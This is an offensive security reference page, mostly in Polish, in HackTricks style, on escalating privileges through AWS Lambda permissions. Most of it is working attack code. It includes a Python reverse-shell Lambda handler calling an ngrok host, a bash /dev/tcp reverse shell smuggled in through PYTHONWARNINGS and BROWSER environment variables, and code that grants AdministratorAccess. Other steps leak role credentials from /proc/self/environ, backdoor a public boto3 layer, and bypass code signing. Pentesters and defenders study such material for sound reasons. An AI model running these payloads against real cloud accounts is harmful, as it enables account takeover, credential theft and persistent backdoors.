# AWS - Lambda Privesc

{{#include ../../../banners/hacktricks-training.md}}

## lambda

Więcej informacji o lambda w:

{{#ref}}
../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Użytkownicy posiadający uprawnienia **`iam:PassRole`, `lambda:CreateFunction` i `lambda:InvokeFunction`** mogą eskalować swoje uprawnienia.\
Mogą **utworzyć nową Lambda function i przypisać jej istniejącą IAM role**, nadając funkcji uprawnienia powiązane z tą rolą. Użytkownik może następnie **zapisać i przesłać kod do tej Lambda function (np. z rev shell)**.\
Gdy funkcja zostanie skonfigurowana, użytkownik może **uruchomić jej wykonanie** i zrealizować zamierzone działania, wywołując tę Lambda function przez AWS API. To podejście pozwala użytkownikowi wykonywać zadania pośrednio przez Lambda function, działając z poziomem dostępu nadanym powiązanej IAM role.\\

Atakujący może to wykorzystać, aby uzyskać **rev shell i ukraść token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Możesz również **nadużyć uprawnień roli lambda** z samej funkcji lambda.\
Jeśli rola lambda miała wystarczające uprawnienia, możesz ją użyć, aby nadać sobie prawa administratora:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Możliwe jest też leak poświadczeń roli lambda bez potrzeby połączenia zewnętrznego. Przyda się to dla **Network isolated Lambdas** używanych do zadań wewnętrznych. Jeśli nieznane security groups filtrują twoje reverse shells, ten fragment kodu pozwoli ci bezpośrednio leak poświadczeń jako output lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potencjalny wpływ:** Bezpośredni privesc do dowolnej, wskazanej roli usługi lambda.

> [!CAUTION]
> Należy pamiętać, że chociaż może to wyglądać interesująco, **`lambda:InvokeAsync`** **nie** pozwala samo w sobie na **wykonanie `aws lambda invoke-async`**, potrzebujesz również `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Podobnie jak w poprzednim scenariuszu, możesz **nadać sobie uprawnienie `lambda:InvokeFunction`** jeśli masz uprawnienie **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potencjalny wpływ:** Bezpośredni privesc do dowolnej roli serwisowej lambda wskazanej.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Użytkownicy z uprawnieniami **`iam:PassRole`, `lambda:CreateFunction` i `lambda:CreateEventSourceMapping`** (a potencjalnie także `dynamodb:PutItem` i `dynamodb:CreateTable`) mogą pośrednio **escalate privileges** nawet bez `lambda:InvokeFunction`.\
Mogą utworzyć **Lambda function with malicious code and assign it an existing IAM role**.

Zamiast bezpośrednio wywoływać Lambda, użytkownik tworzy lub wykorzystuje istniejącą tabelę DynamoDB, łącząc ją z Lambda przez event source mapping. Ta konfiguracja zapewnia, że Lambda function jest **triggered automatically upon a new item** w tabeli — czy to przez działanie użytkownika, czy inny proces — tym samym pośrednio wywołując Lambda function i wykonując kod z uprawnieniami przekazanej IAM role.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Jeśli DynamoDB jest już aktywny w środowisku AWS, użytkownik **musi jedynie skonfigurować event source mapping** dla funkcji Lambda. Jednak jeśli DynamoDB nie jest używany, użytkownik musi **utworzyć nową tabelę** z włączonym streamingiem:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Teraz można **połączyć funkcję Lambda z tabelą DynamoDB** poprzez **utworzenie event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Gdy funkcja Lambda jest powiązana ze strumieniem DynamoDB, attacker może **pośrednio uruchomić Lambdę, aktywując DynamoDB stream**. Można to osiągnąć poprzez **wstawienie elementu** do tabeli DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potencjalny wpływ:** Bezpośrednie privesc do określonej lambda service role.

### `lambda:AddPermission`

Atakujący posiadający to uprawnienie może **przyznać sobie (lub innym) dowolne uprawnienia** (to generuje polityki oparte na zasobach, które przyznają dostęp do zasobu):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Potential Impact:** Bezpośredni privesc do roli serwisowej lambda użytej poprzez nadanie uprawnienia do modyfikacji kodu i jego uruchomienia.

### `lambda:AddLayerVersionPermission`

Atakujący posiadający to uprawnienie może **nadać sobie (lub innym) uprawnienie `lambda:GetLayerVersion`**. Może uzyskać dostęp do layera i wyszukiwać podatności lub wrażliwe informacje.
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potential Impact:** Potencjalny dostęp do wrażliwych informacji.

### `lambda:UpdateFunctionCode`

Użytkownicy posiadający uprawnienie **`lambda:UpdateFunctionCode`** mają możliwość **modyfikacji kodu istniejącej funkcji Lambda powiązanej z rolą IAM.**\
The attacker can **modify the code of the lambda to exfiltrate the IAM credentials**.

Chociaż attacker może nie mieć bezpośredniej możliwości wywołania funkcji, jeśli funkcja Lambda jest już istniejąca i działa, prawdopodobne jest, że zostanie uruchomiona przez istniejące przepływy pracy lub zdarzenia, co pośrednio ułatwi wykonanie zmodyfikowanego kodu.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potencjalny wpływ:** Bezpośredni privesc do używanej roli serwisowej lambda.

### `lambda:UpdateFunctionConfiguration`

#### RCE przez zmienne środowiskowe

Dzięki tym uprawnieniom możliwe jest dodanie zmiennych środowiskowych, które spowodują, że Lambda wykona dowolny kod. Na przykład w pythonie można wykorzystać zmienne środowiskowe `PYTHONWARNING` i `BROWSER`, aby sprawić, że proces python wykona dowolne polecenia:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Dla innych języków skryptowych istnieją inne zmienne środowiskowe (env variables), których możesz użyć. Więcej informacji znajdziesz w podsekcjach dotyczących języków skryptowych w:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE przez Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) pozwala umieścić **code** w Twojej funkcji lamdba, ale **przechowywać go osobno**, dzięki czemu kod funkcji może pozostać niewielki, a **wiele funkcji może współdzielić code**.

Wewnątrz lambda możesz sprawdzić ścieżki, z których ładowany jest python code, używając funkcji takiej jak poniższa:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Oto miejsca:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Na przykład biblioteka boto3 jest ładowana z `/var/runtime/boto3` (4. pozycja).

#### Exploitation

Można nadużyć uprawnienia `lambda:UpdateFunctionConfiguration`, aby **dodać nowy layer** do funkcji lambda. Aby wykonać dowolny kod, ten layer musi zawierać jakąś **bibliotekę, którą lambda zaimportuje.** Jeśli możesz odczytać kod lambda, łatwo to znajdziesz; zwróć też uwagę, że możliwe, iż lambda **już używa layer** i możesz **pobrać** layer i **dodać tam swój kod**.

Na przykład, załóżmy, że lambda używa biblioteki boto3 — to stworzy lokalny layer z najnowszą wersją biblioteki:
```bash
pip3 install -t ./lambda_layer boto3
```
Możesz otworzyć `./lambda_layer/boto3/__init__.py` i **dodać backdoor w globalnym kodzie** (np. funkcję do exfiltrate credentials lub uzyskania reverse shell).

Następnie spakuj katalog `./lambda_layer` i **upload the new lambda layer** na swoje konto (lub na konto ofiary, ale możesz nie mieć do tego uprawnień).\
Zauważ, że musisz utworzyć folder python i umieścić tam biblioteki, aby nadpisać /opt/python/boto3. Dodatkowo layer musi być **compatible with the python version** używany przez lambda, a jeśli wgrasz go na swoje konto, musi być w tym samym **region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Teraz spraw, aby przesłany lambda layer był **dostępny dla dowolnego konta**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Następnie dołącz lambda layer do victim lambda function:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Następnym krokiem byłoby albo **wywołanie funkcji** samemu, jeśli możemy, albo poczekanie aż **zostanie wywołana** normalnymi środkami — co jest bezpieczniejszą metodą.

**Bardziej dyskretny sposób wykorzystania tej podatności** można znaleźć w:

{{#ref}}
../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potencjalny wpływ:** Bezpośredni privesc do roli usługi lambda użytej.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Możliwe, że z tymi uprawnieniami będziesz w stanie utworzyć funkcję i wykonać ją wywołując URL... ale nie znalazłem sposobu, by to przetestować, daj znać jeśli Tobie się uda!

### Lambda MitM

Niektóre lambdas będą **odbierać w parametrach poufne informacje od użytkowników.** Jeśli zdobędziesz RCE w jednej z nich, możesz exfiltrate informacje przesyłane do niej przez innych użytkowników — sprawdź to w:

{{#ref}}
../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

Jeśli funkcja Lambda wymusza Code Signing, atakujący, który może usunąć Code Signing Config (CSC) lub obniżyć jego ustawienie do Warn, może wdrożyć do funkcji unsigned code. To omija zabezpieczenia integralności bez modyfikowania IAM role funkcji ani triggerów.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- For Path B, you don't need an AWS Signer profile if the CSC policy is set to `WARN` (unsigned artifacts allowed).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepare a small payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Ścieżka A) Usuń CSC, a następnie zaktualizuj kod:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Ścieżka B) Obniżyć do Warn i zaktualizować kod (jeśli usuwanie nie jest dozwolone):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Zweryfikowano.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Potencjalny wpływ: Możliwość wgrania i uruchomienia dowolnego niepodpisanego kodu w funkcji, która miała wymuszać podpisane wdrożenia, co może prowadzić do wykonania kodu z uprawnieniami roli funkcji.

Czyszczenie:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

